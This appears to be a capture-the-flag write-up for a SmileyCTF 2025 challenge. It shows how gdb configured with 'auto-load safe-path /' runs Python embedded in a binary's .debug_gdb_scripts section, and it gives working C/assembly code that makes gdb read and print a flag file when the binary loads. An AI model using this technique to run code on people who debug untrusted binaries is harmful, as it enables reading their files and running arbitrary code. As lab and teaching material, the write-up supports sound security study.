---
title: Debuggable-2

published: 2025-06-14

description: GDB Exploit

tags: [pwn, gdb, python, c]

category: SmileyCTF 2025
---

# Debuggable-2
> GDB is safe if you never run the binary right?

## Files

```
Dockerfile
run.py
script
```

This time we have an extra file `script` that has one line: `set auto-load safe-path /`

This script is put in our .gdbinit for our docker container

The `run.py` has also changed to run:
```
q
```

## Approach

`set auto-load safe-path /` basically lets gdb run any script that is embedded in our binary

So all we have to do is embed malicious python code in our binary that outputs the contents of `/app/flag.txt`

Looking at the [GDB Docs](https://sourceware.org/gdb/current/onlinedocs/gdb.html/dotdebug_005fgdb_005fscripts-section.html) we can see some examples for embedding python code

There are 2 ways to do this:
- embedding a refrence to a python script
- embedding a python script itself

We will use the second since we can't use any python scripts on the server

## Solution

We make a basic c file using the docs sample:
```c
asm(
".pushsection \".debug_gdb_scripts\", \"MS\",@progbits,1\n"
".byte 4\n"                          // SECTION_SCRIPT_ID_PYTHON_TEXT = 4
".ascii \"gdb.printflag\\n\"\n"
".ascii \"import gdb\\n\"\n"
".ascii \"f = open('/app/flag.txt', 'r')\\n\"\n"
".ascii \"content = f.read()\\n\"\n"
".ascii \"f.close()\\n\"\n"
".ascii \"gdb.write(content)\\n\"\n"
".byte 0\n"
".popsection\n"
);

int main(){}
```

which embeds the python code:
```python
import gdb
f = open('/app/flag.txt', 'r')
content = f.read()
f.close()
gdb.write(content)
```

Compile this, and we have successfully created a binary that will immediately dump the contents of `/app/flag.txt` upon loading the binary

Convert this to base64 send to the instance and we get our flag `.;,;.{random_embedded_scripting_languages_what_could_possibly_go_wrong}`
